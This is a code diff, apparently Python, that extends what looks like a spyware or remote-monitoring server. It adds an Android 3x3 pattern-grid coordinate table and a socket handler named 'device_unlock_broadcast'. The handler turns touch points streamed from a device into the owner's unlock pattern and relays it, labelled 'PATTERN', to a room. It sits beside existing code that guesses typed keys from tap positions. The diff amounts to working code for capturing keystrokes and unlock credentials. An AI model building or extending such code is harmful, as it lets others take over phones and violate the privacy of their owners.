@@ -29,6 +29,11 @@ BUTTONS = [
     {"key": "Z", "x": 0.15, "y": 0.76}, {"key": "X", "x": 0.25, "y": 0.76}, {"key": "C", "x": 0.35, "y": 0.76},
     {"key": "V", "x": 0.45, "y": 0.76}, {"key": "B", "x": 0.55, "y": 0.76}, {"key": "N", "x": 0.65, "y": 0.76}, {"key": "M", "x": 0.75, "y": 0.76},
     {"key": "SPACE", "x": 0.50, "y": 0.85}, {"key": "ENTER", "x": 0.90, "y": 0.85},
+
+    # --- Android Pattern Grid (3x3) ---
+    {"key": "P1", "x": 0.25, "y": 0.35}, {"key": "P2", "x": 0.50, "y": 0.35}, {"key": "P3", "x": 0.75, "y": 0.35},
+    {"key": "P4", "x": 0.25, "y": 0.50}, {"key": "P5", "x": 0.50, "y": 0.50}, {"key": "P6", "x": 0.75, "y": 0.50},
+    {"key": "P7", "x": 0.25, "y": 0.65}, {"key": "P8", "x": 0.50, "y": 0.65}, {"key": "P9", "x": 0.75, "y": 0.65},
 ]
 
 def calculate_distance(x1, y1, x2, y2):
@@ -70,6 +75,35 @@ def on_device_click(data):
         "x": x,
         "y": y,
         "guessed_key": guessed_key,
+        "clickId": click_id
+    })
+    sys.stdout.flush()
+
+@sio.on('device_unlock_broadcast')
+def on_device_unlock(data):
+    points = data.get('points', [])
+    click_id = data.get('clickId')
+    incoming_room = data.get('roomId')
+
+    if not points:
+        return
+
+    # Analyze points to find which pattern dots were hit
+    hit_dots = []
+    for p in points:
+        dot = guess_nearest_button(p['x'], p['y'])
+        if dot.startswith("P") and (not hit_dots or hit_dots[-1] != dot):
+            hit_dots.append(dot)
+
+    pattern_str = " -> ".join(hit_dots) if hit_dots else "Unknown Pattern"
+
+    print(f"DEBUG: Pattern detected: {pattern_str} in Room:{incoming_room}", flush=True)
+
+    sio.emit('ai_key_guess', {
+        "roomId": incoming_room,
+        "x": points[0]['x'],
+        "y": points[0]['y'],
+        "guessed_key": f"PATTERN: {pattern_str}",
         "clickId": click_id
     })
     sys.stdout.flush()
